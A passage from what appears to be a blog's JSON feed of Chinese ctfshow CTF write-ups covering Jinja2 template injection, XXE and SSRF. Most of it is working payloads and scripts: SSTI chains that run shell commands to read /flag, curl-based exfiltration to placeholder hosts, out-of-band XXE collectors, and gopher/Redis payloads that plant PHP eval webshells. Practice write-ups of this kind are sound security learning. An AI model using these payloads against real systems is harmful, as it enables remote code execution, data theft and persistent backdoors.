            "content_html": "<h1 id=\"web-361\"><a href=\"#web-361\" class=\"headerlink\" title=\"web 361\"></a>web 361</h1><p>提示考点在名字</p>\n<p>尝试<code>?name={{4+4}}</code>，返回出错，确认为注入点</p>\n<p>于是<code>?name={{''.__class__.__mro__[1].__subclasses__()}}</code></p>\n<p>找到</p>\n<p><code>&lt;class 'os._wrap_close'&gt;</code></p>\n<p>然后</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<p>得到 app.py</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}</code></p>\n<p>得到 app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}</code></p>\n<p>得到flag</p>\n<p>或者<code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<h1 id=\"web-362\"><a href=\"#web-362\" class=\"headerlink\" title=\"web 362\"></a>web 362</h1><p>进行了过滤，但不清楚过滤啥</p>\n<p>只能发现上面os的不能选择，于是选择407的<code>&lt;class 'subprocess.Popen'&gt;</code></p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['popen']('ls').read()}}</code>则不行</p>\n<p>payload:<code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}}</code></p>\n<h1 id=\"web-363\"><a href=\"#web-363\" class=\"headerlink\" title=\"web 363\"></a>web 363</h1><p><code>?name={{()[request.args.a].__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.b].eval(request.args.c)}}&amp;a=__class__&amp;b=__builtins__&amp;c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<h1 id=\"web-364\"><a href=\"#web-364\" class=\"headerlink\" title=\"web 364\"></a>web 364</h1><p>cookies绕过</p>\n<p><code>?name={{x.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.b].eval(request.cookies.c)}}</code></p>\n<p><code>b=__builtins__</code></p>\n<p><code>c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<p>或者<code>?name={{x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.c)}}</code></p>\n<h1 id=\"web-365\"><a href=\"#web-365\" class=\"headerlink\" title=\"web 365\"></a>web 365</h1><p>同上一题</p>\n<h1 id=\"web-366\"><a href=\"#web-366\" class=\"headerlink\" title=\"web 366\"></a>web 366</h1><p>上面的几乎都过滤了，下划线也过滤了，而attr用于获取变量</p>\n<pre><code class=\"raw\">\"\"|attr(\"__class__\")\n相当于\n\"\".__class__\n</code></pre>\n<p>故<code>?name={{(x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}</code></p>\n<pre><code class=\"raw\">a=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n</code></pre>\n<h1 id=\"web-367\"><a href=\"#web-367\" class=\"headerlink\" title=\"web 367\"></a>web 367</h1><p>同web 366</p>\n<h1 id=\"web-368\"><a href=\"#web-368\" class=\"headerlink\" title=\"web 368\"></a>web 368</h1><p><code>{{`被过滤,使用`{%%}`绕过,再借助`print()`回显\n\n故`?name={%print((x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))%}`\n\n```raw\na=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n```\n\n# web 369\n\n过滤了request，这就需要自己来凑字符串\n\n## 解法一\n\n这里拿config来凑。一般我们想到的是使用`__str__()`，但是一个问题是`_`被ban了，所以`__str__()`用不了；这里拿string过滤器来得到config的字符串：`config|string`，但是获得字符串后本来应该用中括号或者`__getitem__()`，但是问题是`_`和`[` `]`被ban了，所以获取字符串中的某个字符比较困难。这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层`lower()`方法，方便跑更多字符\n\n这里用的是`{{lipsum.__globals__['os'].popen('cat /flag').read()}}</code></p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-04-09 09:39:23\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-04-09 11:33:12\nDescription  : \n'''\n\n\nimport requests\nurl=\"http://26e2b843-cdf9-4c43-8946-f748dd29eb7f.challenge.ctf.show/?name={{% print (config|string|list).pop({}).lower() %}}\"\n \npayload=[\"__globals__\",\"os\",\"cat /flag\"]\ndef get_res(payload_list):\n    dic = {}\n    result= []\n    for payload in payload_list:\n        tmp_res = \"\"\n        for j in payload:\n            try:\n                print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(dic[j],j))\n                tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(dic[j])\n            except:\n                for i in range(0,1000):\n                    r=requests.get(url=url.format(i))\n                    location=r.text.find(\"&lt;h3&gt;\")\n                    word=r.text[location+4:location+5]\n                    if word==j.lower():\n                        print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(i,j))\n                        tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(i)\n                        dic[j] = i\n                        break\n        result.append(tmp_res[:len(tmp_res)-1])\n    return result\n\nprint(get_res(payload))\n\n# \"?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}\"\n</code></pre>\n<p>或者也可构造前面使用过的，如<code>?name={{x.__init__.__globals__.__getitem__[\"__builtins__\"].eval(\"__import__('os').popen('cat /flag').read()\")}}</code></p>\n<p>但要注意的是，使用<code>|attr</code>进行连接时，后面要带上参数时,需将前面一块用括号括起，如要获取到<code>builtins</code>的内容，<code>(x|attr('__init__')|attr('__globals__')|attr('__getitem__'))('__builtins__')</code></p>\n<p>如果是使用前面的，这里试验了以下，也是可以的</p>\n<pre><code class=\"raw\">?name={% print (((x|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(21).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).eval((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(18).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()))((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()))()\n```\n\n## 解法二\n\n```raw\nGET:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{%print(x.open(file).read())%}\n</code></pre>\n<p>原理是</p>\n<pre><code class=\"raw\">{% set a=dict(o=oo,s=ss)|join %}\n</code></pre>\n<p>这样得到的a就是把这个字典的键名拼接后的值，即os，这样的拼接不需要用到单双引号，非常方便。至于要做的，就是想办法把类似<code>_</code>这样的字符通过一系列操作找出来就可以了</p>\n<p>如何得到_?</p>\n<pre><code class=\"raw\">{% set a=(()|select|string|list)|attr(po)(24)%}\n</code></pre>\n<p>此时a=_</p>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>读文件盲注</p>\n<pre><code class=\"python\">import requests\nimport string\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\nurl ='''http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{% set cmd2='''\n \ns=string.digits+string.ascii_lowercase+'{_-}'\nflag=''\nfor i in range(1,50):\n\tprint(i)\n\tfor j in s:\n\t\tx=flag+j\n\t\tu=url+ccchr(x)+'%}'+'{% if x.open(cmd).read('+str(i)+')==cmd2%}'+'1341'+'{% endif%}'\n        #print(u)\n        r=requests.get(u)\n        if(\"1341\" in r.text):\t\t\t\n            flag=x\n            print(flag)\n            break\n</code></pre>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>反弹shell，监听 nc -lvp 4567</p>\n<pre><code class=\"python\">http://da9612ac-2b66-485d-8149-b76a1f03d22c.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\n123\n{%endif%}\n \n//cmd的值用这个脚本生成\ns='__import__(\"os\").popen(\"curl http://xxx:4567?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\n</code></pre>\n<h1 id=\"web-370\"><a href=\"#web-370\" class=\"headerlink\" title=\"web 370\"></a>web 370</h1><p>经测试，相比之前又过滤掉了数字</p>\n<p>获取数字的话有两个方法</p>\n<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p><code>index()</code></p>\n<p>用来获取索引值</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p><code>length()/count()</code></p>\n<p>用来获取长度值(注意<code>%2b</code>防止<code>+</code>被解析为空格)<br>$$<br>24 = (2^2)^2 + 2 ^ 3\\<br>47 = (2^2)^2 * 3 - 1\\<br>102 = ((2^2)^2+1) * 2 * 3\\<br>108 = ((2^2)^2+2) * 2 * 3\\<br>97 = ((2^2)^2) * 2 * 3\\<br>103 = ((2^2)^2+1) * 2 * 3 + 1<br>$$</p>\n<pre><code class=\"raw\">?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set one = (dict(a=a)|join|length) %}\n{% set two = (dict(aa=a)|join|length) %}\n{% set three = (dict(aaa=a)|join|length) %}\n{% set a=(()|select|string|list)|attr(po)(two**two**two%2btwo**three) %}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(three*(two**two**two)-one)%2bchr(two*three*(two**two**two%2bone))%2bchr(two*three*(two**two**two%2btwo))%2bchr(two*three*(two**two**two)%2bone)%2bchr(two*three*(two**two**two%2bone)%2bone)%}\n{% print(x.open(file).read()) %}\n</code></pre>\n<h1 id=\"web-371\"><a href=\"#web-371\" class=\"headerlink\" title=\"web 371\"></a>web 371</h1><p>ban掉了print，这里使用反弹shell</p>\n<pre><code class=\"raw\">?name=\n{% set c=(t|count)%}\n{% set cc=(dict(e=a)|join|count)%}\n{% set ccc=(dict(ee=a)|join|count)%}\n{% set cccc=(dict(eee=a)|join|count)%}\n{% set ccccc=(dict(eeee=a)|join|count)%}\n{% set cccccc=(dict(eeeee=a)|join|count)%}\n{% set ccccccc=(dict(eeeeee=a)|join|count)%}\n{% set cccccccc=(dict(eeeeeee=a)|join|count)%}\n{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}\n{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}\n{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}\n{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}\n{% set coun=(ccc~ccccc)|int%}\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(coun)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\nabc\n{%endif%}\n</code></pre>\n<p><code>cmd</code>的内容用以下python脚本跑出</p>\n<pre><code class=\"python\">def aaa(t):\n    t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'\n    return t\nip = \"\"\nport = 56414\ns=f'__import__(\"os\").popen(\"curl {ip}:{port}?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+aaa(str(ord(s[i])))+')%2b'\n        else:\n            t+='chr('+aaa(str(ord(s[i])))+')'\n    return t\nprint(ccchr(s))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/524679b/",
            "url": "http://dpm12345.cn/posts/524679b/",
            "title": "2023年CTF",
            "date_published": "2023-03-20T13:12:40.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"除夕\"><a href=\"#除夕\" class=\"headerlink\" title=\"除夕\"></a>除夕</h2><p>考察得是PHP得若等于，这里可以用科学计数法</p>\n<p><code>?year=202.2e1</code></p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"初二\"><a href=\"#初二\" class=\"headerlink\" title=\"初二\"></a>初二</h2><h2 id=\"初四\"><a href=\"#初四\" class=\"headerlink\" title=\"初四\"></a>初四</h2>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e93ac459/",
            "url": "http://dpm12345.cn/posts/e93ac459/",
            "title": "XXE",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-373\"><a href=\"#web-373\" class=\"headerlink\" title=\"web 373\"></a>web 373</h1><p>burp进行提交，hackbar影响上传</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE test [\n&lt;!ENTITY xxe SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;zhong&gt;\n&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;\n&lt;/zhong&gt;\n</code></pre>\n<h1 id=\"web374-376\"><a href=\"#web374-376\" class=\"headerlink\" title=\"web374~376\"></a>web374~376</h1><p>可以引用外部实体，在服务器写以下文件</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\n$content = $_GET['1'];\nif(isset($content)){\n    file_put_contents('flag.txt',\"flag如下\\n\".$content);\n}else{\n    echo 'no data input';\n}\n</code></pre>\n<p>xxe.xml</p>\n<pre><code class=\"xml\">&lt;!ENTITY % all\n\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/exp.php?1=%file;'\"\n&gt;\n%all;\n</code></pre>\n<p>payload为</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;\n</code></pre>\n<p>得到flag</p>\n<h1 id=\"web-377\"><a href=\"#web-377\" class=\"headerlink\" title=\"web 377\"></a>web 377</h1><p><code>if(preg_match('/&lt;\\?xml version=\"1\\.0\"|http/i', $xmlfile))</code></p>\n<p>增加了对<code>http</code>的过滤</p>\n<p>利用 utf-16 编码</p>\n<pre><code class=\"python\">a ='''\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;'''\nimport requests\n\n\ndata = a.encode('utf-16')\n\nurl = 'http://129c32f8-755b-4686-ad48-257a0011c8aa.challenge.ctf.show/'\n\nrequests.post(url=url,data=data)\n</code></pre>\n<h1 id=\"web-378\"><a href=\"#web-378\" class=\"headerlink\" title=\"web 378\"></a>web 378</h1><p>抓包，可以发现用户，密码用<code>XML</code>形式发送</p>\n<p>可以直接回显</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY file SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;user&gt;\n&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/fe1aa8c3/",
            "url": "http://dpm12345.cn/posts/fe1aa8c3/",
            "title": "XSS",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-316\"><a href=\"#web-316\" class=\"headerlink\" title=\"web 316\"></a>web 316</h1>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/813434ca/",
            "url": "http://dpm12345.cn/posts/813434ca/",
            "title": "SSRF",
            "date_published": "2023-03-16T14:12:40.000Z",
            "content_html": "<h1 id=\"web-351\"><a href=\"#web-351\" class=\"headerlink\" title=\"web 351\"></a>web 351</h1><p>网页目录下有flag.php，访问后返回非本地用户无法访问</p>\n<p>于是post参数url <code>url=http://127.0.0.1/flag.php</code></p>\n<p>得到flag</p>\n<h1 id=\"web-352\"><a href=\"#web-352\" class=\"headerlink\" title=\"web 352\"></a>web 352</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127.0.0/')){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt; \n</code></pre>\n<p>限定”http”/“https”，且过滤了<code>127.0.0</code>和<code>localhost</code>，这涉及到<code>127.0.0.1</code>的他种写法</p>\n<p>有很多如<code>0</code>，<code>127.1</code>,<code>127.0.1</code>,`</p>\n<p>或者进制转换</p>\n<p>或者写个重定向的网页</p>\n<h1 id=\"web-353\"><a href=\"#web-353\" class=\"headerlink\" title=\"web 353\"></a>web 353</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>同上题,使用<code>127.1</code>,<code>0</code>等</p>\n<h1 id=\"web-354\"><a href=\"#web-354\" class=\"headerlink\" title=\"web 354\"></a>web 354</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|1|0|。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>不能出现<code>localhost</code>,<code>1</code>,<code>0</code>,<code>。</code>等字符</p>\n<p>故这里使用302跳转重定向或改本地域名的A记录到127.0.0.1上</p>\n<h1 id=\"web-355\"><a href=\"#web-355\" class=\"headerlink\" title=\"web 355\"></a>web 355</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=5)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>要求长度小于5，那么可以使用<code>127.1</code>,<code>0</code></p>\n<h1 id=\"web-356\"><a href=\"#web-356\" class=\"headerlink\" title=\"web 356\"></a>web 356</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=3)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>长度小于3.使用<code>0</code></p>\n<h1 id=\"web-357\"><a href=\"#web-357\" class=\"headerlink\" title=\"web 357\"></a>web 357</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$ip = gethostbyname($x['host']);\necho '&lt;/br&gt;'.$ip.'&lt;/br&gt;';\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {\n    die('ip!');\n}\n\n\necho file_get_contents($_POST['url']);\n}\nelse{\n    die('scheme');\n}\n?&gt;\n</code></pre>\n<p>302跳转</p>\n<h1 id=\"web-358\"><a href=\"#web-358\" class=\"headerlink\" title=\"web 358\"></a>web 358</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){\n    echo file_get_contents($url);\n}\n</code></pre>\n<p>payload:<code>http://ctf.@127.0.0.1/flag.php?show</code></p>\n<h1 id=\"web-359\"><a href=\"#web-359\" class=\"headerlink\" title=\"web 359\"></a>web 359</h1><p>利用</p>\n<pre><code class=\"raw\">Give MySQL username: root                                                                          \nGive query to execute: select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01\n</code></pre>\n<p>在<code>check.php</code>上post参数<code>returl=xxx</code>，其中下划线后面的要url编码，使网站目录下生成含一句话木马的<code>1.php</code></p>\n<h1 id=\"web-360\"><a href=\"#web-360\" class=\"headerlink\" title=\"web 360\"></a>web 360</h1><p>根据题目提示，打redis</p>\n<pre><code class=\"raw\">What do you want?? (ReverseShell/PHPShell): PHPShell\n\nGive web root location of server (default is /var/www/html):                                       \nGive PHP Payload (We have default PHP Shell): &lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<p>访问<code>shell.php</code>，然后正常rce</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7f1ae6d2/",
            "url": "http://dpm12345.cn/posts/7f1ae6d2/",
            "title": "java",
            "date_published": "2023-03-16T14:12:40.000Z",
